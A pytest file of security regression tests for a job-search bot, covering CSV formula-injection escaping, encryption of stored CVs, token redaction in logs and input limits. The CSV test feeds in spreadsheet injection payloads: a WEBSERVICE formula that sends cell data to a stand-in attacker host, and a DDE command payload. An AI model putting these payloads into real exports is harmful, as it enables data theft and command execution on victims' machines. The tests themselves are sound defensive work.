"""Regression tests for the security hardening: CSV injection, CV encryption, redaction, limits."""

from __future__ import annotations

import base64
import csv
import io
import os
from datetime import UTC, datetime

import pytest
from pydantic import ValidationError as PydanticValidationError
from pypdf import PdfWriter
from sqlalchemy import select

from give_me_job_please.config import Settings
from give_me_job_please.core.auth.crypto import SecretBox
from give_me_job_please.core.exporter import export_csv_bytes
from give_me_job_please.core.models import EnrichedOffer, JobOffer, UserProfile
from give_me_job_please.core.parsers.cv_parser import parse_cv_bytes
from give_me_job_please.errors import ParseError
from give_me_job_please.logging_setup import redact_secrets_processor, redact_string
from give_me_job_please.storage.db import create_engine_and_sessionmaker
from give_me_job_please.storage.orm import Base, UserConfigORM
from give_me_job_please.storage.repository import OfferRepository

_TOKEN = "123456789:" + "A" * 35


def _offer(
    *,
    title: str = "AI Security Intern",
    company: str = "CyberLab",
    assignment_location: str = "Lausanne",
    match_summary: str = "",
) -> EnrichedOffer:
    return EnrichedOffer(
        offer=JobOffer(
            uid="isacademia:10001",
            external_id="10001",
            title=title,
            company=company,
            assignment_location=assignment_location,
        ),
        match_summary=match_summary,
    )


def test_csv_export_neutralises_formula_cells() -> None:
    payload = export_csv_bytes(
        [
            _offer(
                title='=WEBSERVICE("https://attacker/?"&A1)',
                company="-1+1",
                assignment_location="  @SUM(A1)",
                match_summary="+cmd|'/c calc'!A0",
            )
        ]
    ).decode("utf-8-sig")

    row = next(csv.DictReader(io.StringIO(payload)))
    assert row["internship"] == "'=WEBSERVICE(\"https://attacker/?\"&A1)"
    assert row["company"] == "'-1+1"
    assert row["assignment_location"] == "'  @SUM(A1)"
    assert row["match_summary"] == "'+cmd|'/c calc'!A0"

    plain = next(csv.DictReader(io.StringIO(export_csv_bytes([_offer()]).decode("utf-8-sig"))))
    assert plain["internship"] == "AI Security Intern"
    assert plain["company"] == "CyberLab"


async def _make_repo(secret_box: SecretBox | None) -> tuple[OfferRepository, object]:
    engine, session_factory = create_engine_and_sessionmaker("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    return OfferRepository(session_factory, secret_box=secret_box), engine


async def test_cv_text_is_encrypted_at_rest_and_roundtrips() -> None:
    repo, engine = await _make_repo(SecretBox(os.urandom(32)))
    try:
        await repo.save_profile(
            UserProfile(
                user_id=42,
                cv_text="John Doe, john.doe@example.com",
                cv_filename="cv.pdf",
            )
        )

        # The read path transparently returns plaintext to callers.
        loaded = await repo.get_or_create_profile(42)
        assert loaded.cv_text == "John Doe, john.doe@example.com"

        # The raw column must not contain the plaintext.
        async with repo._sessions() as session:
            raw = (await session.execute(select(UserConfigORM.cv_text))).scalar_one()
        assert raw.startswith("enc:v1:")
        assert "john.doe@example.com" not in raw
    finally:
        await engine.dispose()


async def test_legacy_plaintext_cv_row_is_still_readable() -> None:
    repo, engine = await _make_repo(SecretBox(os.urandom(32)))
    try:
        async with repo._sessions() as session:
            session.add(
                UserConfigORM(
                    user_id=7,
                    cv_text="legacy plaintext resume",
                    profile_hash="h",
                    cv_hash="c",
                    updated_at=datetime.now(UTC),
                )
            )
            await session.commit()

        assert (await repo.get_or_create_profile(7)).cv_text == "legacy plaintext resume"
    finally:
        await engine.dispose()


def test_redaction_catches_bot_api_urls_and_tuples() -> None:
    leaked = f"POST https://api.telegram.org/file/bot{_TOKEN}/documents/file.pdf failed"
    cleaned = redact_string(leaked)
    assert _TOKEN not in cleaned
    assert cleaned.endswith("/documents/file.pdf failed")

    event = redact_secrets_processor(None, "error", {"args": (f"bot{_TOKEN}", "ok")})
    assert _TOKEN not in str(event["args"])
    assert event["args"][1] == "ok"


def test_pdf_page_cap_rejects_oversized_documents() -> None:
    writer = PdfWriter()
    for _ in range(21):
        writer.add_blank_page(width=200, height=200)
    buf = io.BytesIO()
    writer.write(buf)

    with pytest.raises(ParseError) as exc_info:
        parse_cv_bytes(buf.getvalue(), "cv.pdf")
    assert "maximum supported is 20" in exc_info.value.user_message


def test_empty_whitelist_fails_fast() -> None:
    common = {
        "_env_file": None,
        "telegram_bot_token": _TOKEN,
        "encryption_key": base64.urlsafe_b64encode(os.urandom(32)).decode(),
    }
    with pytest.raises(PydanticValidationError):
        Settings(telegram_allowed_user_ids=[], **common)

    settings = Settings(telegram_allowed_user_ids=[42], **common)
    assert settings.telegram_allowed_user_ids == [42]
